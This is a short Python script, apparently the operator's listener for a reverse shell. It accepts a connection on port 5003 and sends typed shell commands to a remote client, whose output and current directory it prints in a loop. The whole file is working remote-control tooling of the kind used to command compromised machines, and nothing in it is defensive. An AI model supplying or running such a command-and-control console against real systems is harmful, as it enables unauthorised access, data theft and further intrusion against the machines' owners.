import socket

# server host and port
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
# message buffer size, 128kb
BUFFER_SIZE = 1024 * 128
# message seperator
SEPARATOR = "<sep>"

# create socket object
s = socket.socket()
s.bind((SERVER_HOST,SERVER_PORT))

# socket listen
s.listen(5)
print(f"listening as {SERVER_HOST}:{SERVER_PORT} ...")

# client connection handling
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# recieve current working directory
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
